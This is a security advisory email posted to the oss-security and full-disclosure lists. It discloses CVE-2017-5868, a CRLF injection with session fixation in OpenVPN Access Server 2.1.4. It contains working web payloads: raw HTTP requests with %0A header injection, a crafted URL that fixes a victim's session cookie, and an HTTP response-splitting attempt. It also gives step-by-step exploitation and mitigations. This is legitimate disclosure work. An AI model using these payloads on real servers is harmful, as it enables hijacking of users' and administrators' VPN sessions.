X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7585" "Tuesday" "23" "May" "2017" "15:03:32" "+0200" "Sydream Labs" "labs@sysdream.com" "<2a5b2333-339b-875d-edb6-9d7e2f001dab@sysdream.com>" "250" "[oss-security] [CVE-2017-5868] OpenVPN Access Server : CRLF injection with Session fixation" nil nil nil "5" "2017052313:03:32" "[oss-security] [CVE-2017-5868] OpenVPN Access Server : CRLF injection with Session fixation" (number mark "U       labs@sysdrea May 23  250/7585  " thread-indent "\"[oss-security] [CVE-2017-5868] OpenVPN Access Server : CRLF injection with Session fixation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24298 invoked by uid 550); 23 May 2017 13:04:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24275 invoked from network); 23 May 2017 13:04:07 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 45E161A121A
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1495544614;
	bh=XMLwgBJaol89y+LeLEc8n0JIID3ws7hDLBxP6o1mHCg=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=LWyRjum6vjJyII6II27E7Id2RhxzUnHrgQ0HA7TEZRXDSCBDP6dzvtxj4DSukd3o0
	 8pxjsS9R07Ra9hfMHt2YgdVOAoakPTfR/IQehrE7bfuRoNHwn/xsE2Tc976n8LeGZ+
	 pwNeTIJDwSK3G9W+GfVp9wfHJPoMbKzPQTSEPD5Y=
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com, support@openvpn.net
From: Sydream Labs <labs@sysdream.com>
Message-ID: <2a5b2333-339b-875d-edb6-9d7e2f001dab@sysdream.com>
Date: Tue, 23 May 2017 15:03:32 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.1.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="SdBqJwsfcjtIfQnr3eQLQABNLGjatEkpJ"
Subject: [oss-security] [CVE-2017-5868] OpenVPN Access Server : CRLF injection with Session
 fixation

--SdBqJwsfcjtIfQnr3eQLQABNLGjatEkpJ
Content-Type: multipart/mixed; boundary="7CbTdqhuss6Qpt5IifNrkoV7r3HUV4DTf";
 protected-headers="v1"
From: Sydream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com, support@openvpn.net
Message-ID: <2a5b2333-339b-875d-edb6-9d7e2f001dab@sysdream.com>
Subject: [CVE-2017-5868] OpenVPN Access Server : CRLF injection with Session
 fixation

--7CbTdqhuss6Qpt5IifNrkoV7r3HUV4DTf
Content-Type: text/plain; charset=utf-8
Content-Language: fr-classic
Content-Transfer-Encoding: quoted-printable

# OpenVPN Access Server : CRLF injection with Session fixation

## Description

OpenVPN Access Server is a full featured secure network tunneling VPN
software solution that integrates OpenVPN server capabilities,
enterprise management capabilities, simplified OpenVPN Connect UI, and
OpenVPN Client software packages that accommodate Windows, MAC, Linux,
Android, and iOS environments. OpenVPN Access Server supports a wide
range of configurations, including secure and granular remote access to
internal network and/ or private cloud network resources and
applications with fine-grained access control.

## CRLF injection + Session fixation

OpenVPN-AS (Version 2.1.4) is prone to CRLF injection.
Using the character %0A, it is possible to inject headers and content.

Furthermore, this vulnerability allow us to exploit a session fixation
attack.
Indeed, during the authentication the session cookie is poorly handled.

We have not been able to exploit it but the application may be prone to
HTTP Response Splitting attacks.

**Threat**

Exploiting these vulnerabilities, we were able to steal a session from a
victim and then access the application (OpenVPN-AS) with his rights.

Exploiting this on an administrator account may lead to serious
consequences.

**CVE ID**: CVE-2017-5868

**Access Vector**: network

**Security Risk**: medium

**Vulnerability**: CWE-113, CWE-93, CWE-384

**CVSS Base Score**: 5.3 (Medium)

**CVSS Vector**: CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:L

### CRLF injection

It is possible to inject a CRLF character like `%0A` using the URL :
<https://www.mysite.com/__session_start__/>

```
GET /__session_start__/%0atest HTTP/1.1
Host: www.mysite.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Connection: close
Cookie: openvpn_sess_******=3D******dc61
Pragma: no-cache
Cache-Control: no-cache
```

As a result, we obtained this response from the server :

```
HTTP/1.1 302 Found
Date: Wed, 18 Jan 2017 10:19:46 GMT
Connection: close
Content-Type: text/html; charset=3DUTF-8
Location: https://www.mysite.com/
test
Server: OpenVPN-AS

<html>
    <body>
    <p>REDIRECT</p>
    </body>
</html>
```

Thus, the `%0A` character is taken into account and we can clearly see
the test string at an unexpected location.

### Using a CRLF injection in order to do a session fixation attack

Using the CRLF injection and a problem during the authentication phase
(the session cookie is not re-generated), we were able to successfully
exploit a session fixation vulnerability.

In order to exploit this vulnerability, we followed the steps below :

1. As the victim, access the OpenVPN-AS application in order to obtain a
valid session cookie (at this point, the victim is not authenticated).
2. Sent a malicious URL to the victim in order to set his session cookie.

As an example, we aim to inject a Set-Cookie header with a known value :

```
https://www.mysite.com/__session_start__/%0aSet-Cookie:
openvpn_sess_******=3D******cf23; Path=3D/; Secure; HttpOnly
```

This URL will allow the attacker to choose the value of the session
cookie of the victim.

3. At this point, the victim needs to authenticate itself. His profile
(and rights) will then be associated with the session cookie controlled
by the attacker.
4. Finally, as the attacker, we can access the OpenVPN-AS application
with the rights of the victim (using the session cookie).

### Tries for an HTTP Response Splitting attack

We also tried to exploit an HTTP Response Splitting attack without
success, for now.

```
GET
/__session_start__/%0aSet-Cookie:%20openvpn_sess_******=3D******ac42;%20Pat=
h=3D/%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK%0aContent-Type:%20text=
/html%0aContent-Length:%2017%0a%0a<html>TEST</html>
HTTP/1.1
Host: www.mysite.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Connection: close
Cookie: openvpn_sess_******=3D******dc61
Pragma: no-cache
Cache-Control: no-cache
```

As we can see, it is possible to use multiple times the character %0A,
in order to forge another response.

```
HTTP/1.1 302 Found
Date: Wed, 18 Jan 2017 10:29:23 GMT
Connection: close
Content-Type: text/html; charset=3DUTF-8
Location: https://www.mysite.com/
Set-Cookie: openvpn_sess_******=3D******ac42; Path=3D/
Content-Length: 0

Content-Length: 171

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 17

<html>TEST</html>
Server: OpenVPN-AS

3b

<html>
    <body>
    <p>REDIRECT</p>
    </body>
</html>

0
```

### Solution

The vendor didn't provided a patch for this vulnerability. However,
several solutions can be taken :

* Use a Reverse Proxy in order to restrict CRLF characters in URI.
* Restrict access to the web interface (for instance, IP whitelisting).

=46rom the vendor side, several steps need to be taken:

* CRLF characters must be escaped
* Session cookie must be re-generated during the authentication

## Timeline (dd/mm/yyyy)

* 18/01/2017 : Initial discovery.
* 06/02/2017 : First contact with OpenVPN Security team.
* 13/02/2017 : OpenVPN Team request to file a ticket on the Access
Server support system. (#IFX-370-42406)
* 17/02/2017 : Reply from the owner, acknowledging the vulnerability and
planning to fix the vulnerabilities.
* 29/03/2017 : Sysdream Labs request for an ETA, warning for public
disclosure.
* 21/04/2017 : New request for feedback.
* 04/05/2017 : Another and last attempt.
* 23/05/2017 : Public disclosure.

## Credits

* Julien Boulet, Sysdream (j.boulet -at- sysdream -dot- com)


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--7CbTdqhuss6Qpt5IifNrkoV7r3HUV4DTf--

--SdBqJwsfcjtIfQnr3eQLQABNLGjatEkpJ
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIvBAEBCAAZBQJZJDMlEhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoehC
EACmC1S2/ArGRTgf90rJLGsBG2ct3x6xBf0l65h0eFMrxfnHa3xGZzfeq5hgQZDF
VeCsIVSniaPbUEnxDRpj/HfxT5l9D76MzB2ZpxCMnjg8EH0tz8vJHu1YaqDzLWtA
IC89OodERQ6iIsV5BMcOKb9UxsMBFunQZ0/RLSM5+HhqniordpES3mDNhEryNK/k
XBwezFnOUUVkMW/9V7YuKHERpe84ZDpl2ACq5HmEarKOSiVrKvSOI+T4DrHL1Zd4
FRB7UxKLpEJzFUYPGDOC+6xHwxxIqmZYz5Z2XuD8yC4IP0R/qpKjRQOrLE956Jhj
ZUiPmro93fjppBjz4262/sLYTELT7/561EfQhRYm4UKetCOhj5m1EdUideHFy8Sa
sjjCltfJU5iSQkE7ThPFTf3ej+1zV2rAmb4hIczJiEqBcVXIxmfKCeQwhPFaxubh
33mepsJsoKrEgE/PyOV345tQUq+6fl2/XOqLlcJtdIQUU91wGomRkbmADW4cAnBU
RlUAmC8ADrRVBj8DTqWxaEpHa4/6oJhd0jW/u9QranI9O22719WUtpyHjv4Ly2T5
xIO8R2NvwAk+Fue8LOfunZF23XjW0hickci/O025LwnUXbof3o0p1RalU+3bEgi7
Pn0CR6vagy/xk+IP4+TIZrufAKv8vLlt8QuL145x+sYYtw==
=c6LV
-----END PGP SIGNATURE-----

--SdBqJwsfcjtIfQnr3eQLQABNLGjatEkpJ--
